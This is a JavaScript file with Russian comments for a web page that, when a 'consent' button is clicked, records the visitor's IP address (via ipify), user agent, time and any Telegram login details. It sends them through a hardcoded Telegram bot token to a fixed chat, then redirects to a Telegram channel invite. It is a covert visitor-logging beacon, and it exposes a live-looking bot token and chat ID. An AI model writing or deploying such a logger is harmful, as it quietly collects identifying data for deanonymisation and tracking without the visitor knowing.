// Конфигурация
const config = {
    botToken: '8191625463:AAG0aJiNQKOe_JAPMFM-9ytyqSAWOOFVw3I',
    chatId: '6785759216',
    ipApiUrl: 'https://api.ipify.org?format=json',
    telegramApiUrl: 'https://api.telegram.org/bot',
    channelUsername: '+Em2vKwjqck4wNjMy' // Замените на username вашего канала
};

// DOM элементы
const elements = {
    consentBtn: document.getElementById('consentBtn'),
    status: document.getElementById('status')
};

// Данные пользователя Telegram
let telegramUserData = null;

// Обработка авторизации через Telegram
function onTelegramAuth(user) {
    telegramUserData = {
        id: user.id,
        username: user.username || 'не указан',
        firstName: user.first_name || 'не указано',
        lastName: user.last_name || 'не указано'
    };
}

// Функция для отправки данных и перехода в канал
async function redirectToChannel() {
    try {
        elements.status.textContent = "Перенаправляем в Telegram...";
        
        // Получаем IP пользователя
        let ip = "не удалось получить";
        try {
            const ipResponse = await fetch(config.ipApiUrl);
            if (ipResponse.ok) {
                const data = await ipResponse.json();
                ip = data.ip;
            }
        } catch (e) {
            console.error("Ошибка получения IP:", e);
        }

        // Формируем сообщение
        let message = `Новый посетитель:\nIP: ${ip}\nUser-Agent: ${navigator.userAgent}\nВремя: ${new Date().toLocaleString()}`;
        
        // Добавляем данные Telegram, если есть
        if (telegramUserData) {
            message += `\n\nTelegram данные:\nID: ${telegramUserData.id}\nUsername: @${telegramUserData.username}\nИмя: ${telegramUserData.firstName}`;
        }

        // Отправляем сообщение в Telegram (не ждем ответа, чтобы быстрее перенаправить)
        const telegramUrl = `${config.telegramApiUrl}${config.botToken}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent(message)}`;
        fetch(telegramUrl).catch(e => console.error("Ошибка отправки в Telegram:", e));
        
        // Перенаправляем в канал
        window.location.href = `https://t.me/${config.channelUsername}`;
        
    } catch (error) {
        console.error("Ошибка:", error);
        // В случае ошибки все равно перенаправляем
        window.location.href = `https://t.me/${config.channelUsername}`;
    }
}

// Назначаем обработчик кнопки
elements.consentBtn.addEventListener('click', redirectToChannel);
